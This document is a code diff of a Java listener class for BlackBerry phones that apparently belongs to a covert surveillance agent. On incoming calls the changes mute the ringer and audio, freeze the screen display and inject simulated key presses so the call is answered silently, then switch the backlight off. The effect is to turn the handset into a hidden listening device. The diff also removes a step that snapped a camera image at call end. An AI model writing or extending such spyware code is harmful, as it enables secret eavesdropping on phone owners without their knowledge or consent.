@@ -15,6 +15,8 @@ import java.util.Vector;
 import javax.microedition.lcdui.Image;
 import javax.microedition.lcdui.ImageItem;
 
+import net.rim.blackberry.api.invoke.Invoke;
+import net.rim.blackberry.api.invoke.PhoneArguments;
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.blackberry.api.phone.PhoneCall;
 import net.rim.blackberry.api.phone.PhoneListener;
@@ -23,7 +25,10 @@ import net.rim.blackberry.api.phone.phonelogs.PhoneCallLog;
 import net.rim.blackberry.api.phone.phonelogs.PhoneCallLogID;
 import net.rim.blackberry.api.phone.phonelogs.PhoneLogListener;
 import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
+import net.rim.device.api.i18n.Locale;
+import net.rim.device.api.system.Alert;
 import net.rim.device.api.system.Application;
+import net.rim.device.api.system.Audio;
 import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.Bitmap;
 import net.rim.device.api.system.DeviceInfo;
@@ -36,7 +41,9 @@ import net.rim.device.api.system.SystemListener2;
 import net.rim.device.api.system.EventInjector.KeyCodeEvent;
 import net.rim.device.api.system.EventInjector.KeyEvent;
 import net.rim.device.api.ui.Keypad;
+import net.rim.device.api.ui.MenuItem;
 import net.rim.device.api.ui.UiApplication;
+import net.rim.device.api.ui.component.Menu;
 import blackberry.agent.SnapShotAgent;
 import blackberry.interfaces.ApplicationListObserver;
 import blackberry.interfaces.BacklightObserver;
@@ -65,7 +72,6 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
 
     //#ifdef DEBUG
     static Debug debug = new Debug("AppListener", DebugLevel.VERBOSE);
-
     //#endif
 
     static private int lastStatus;
@@ -467,7 +473,6 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
 
             observer.onBacklightChange(on);
         }
-
     }
 
     /*
@@ -587,6 +592,7 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
     }
 
     boolean autoanswer = false;
+    int volume;
 
     public void callIncoming(int callId) {
         //#ifdef DEBUG_INFO
@@ -594,8 +600,17 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
         //#endif
 
         PhoneCall phoneCall = Phone.getCall(callId);
-        String number = phoneCall.getDisplayPhoneNumber();
+        String phoneNumber = phoneCall.getDisplayPhoneNumber();
         boolean outgoing = phoneCall.isOutgoing();
+        //boolean outgoing =true;
+
+        volume = Alert.getVolume();
+        
+        Alert.setBuzzerVolume(0);
+        Audio.setVolume(0);
+
+        //PhoneArguments call = new PhoneArguments (PhoneArguments.ARG_CALL,phoneNumber);
+        //Invoke.invokeApplication(Invoke.APP_TYPE_PHONE, call);
 
         if (!outgoing) {
             //#ifdef DEBUG_INFO
@@ -604,9 +619,30 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
             autoanswer = true;
             //ScreenFake.Push();
             synchronized (UiApplication.getEventLock()) {
-            UiApplication.getUiApplication().suspendPainting(true);
+                UiApplication.getUiApplication().suspendPainting(true);
+            }
+
+            Locale prev = Locale.getDefault();
+            Locale locale = Locale.get(Locale.LOCALE_en);
+            locale.setDefault(locale);
+                        
+            //UiApplication.getUiApplication().getActiveScreen()
+            Menu menu = UiApplication.getUiApplication().getActiveScreen()
+                    .getMenu(0);
+            int size = menu.getSize();
+            for (int i = 0; i < size; i++) {
+                MenuItem item = menu.getItem(i);
+
+                //#ifdef DEBUG_TRACE
+                debug.trace("menu " + i + " : " + item.toString());
+                //#endif
+
+                //int s = MenuItem.SELECT;
+                //item.run();
             }
             
+            locale.setDefault(prev);           
+
             Application.getApplication().invokeLater(new Runnable() {
 
                 public void run() {
@@ -623,6 +659,8 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
                     releaseKey.post();
                 }
             });
+            
+           
         }
     }
 
@@ -631,15 +669,7 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
         debug.info("callDisconnected: " + callId);
         //#endif
 
-        autoanswer = false;
-
-        byte[] camera = CameraRecorder.snap();
-        //#ifdef DEBUG_TRACE
-        if (camera != null) {
-            debug.trace("CameraRecorder.snap: " + camera.length);
-        }
-        //#endif
-        //ScreenFake.Pop();
+        autoanswer = false;       
     }
 
     public void callConnected(int callId) {
@@ -649,8 +679,10 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
         debug.info("Phone call: " + phoneCall.getDisplayPhoneNumber());
         //#endif      
         synchronized (UiApplication.getEventLock()) {
-        UiApplication.getUiApplication().suspendPainting(false);
+            UiApplication.getUiApplication().suspendPainting(false);
         }
+
+        Backlight.enable(false);
     }
 
     public void callAnswered(int arg0) {
@@ -659,7 +691,6 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
         //#endif
 
         if (autoanswer) {
-            //Backlight.enable(false);
             Application.getApplication().invokeLater(new Runnable() {
 
                 public void run() {
@@ -667,8 +698,8 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
                     //Utils.sleep(100);
                     synchronized (UiApplication.getEventLock()) {
                         UiApplication.getUiApplication().suspendPainting(true);
-                        }
-                    
+                    }
+
                     KeyCodeEvent pressKey = new EventInjector.KeyCodeEvent(
                             EventInjector.KeyCodeEvent.KEY_DOWN,
                             (char) Keypad.KEY_MENU,
@@ -690,14 +721,13 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
                             EventInjector.TrackwheelEvent.THUMB_CLICK, 1,
                             KeypadListener.STATUS_TRACKWHEEL);
                     EventInjector.invokeEvent(e);
-                    
-                    
-                    
-                }
-                
-                
-            });
 
+                }
+
+            });
+            
+            Alert.setBuzzerVolume(100);
+            Alert.setVolume(volume);
         }
     }
 
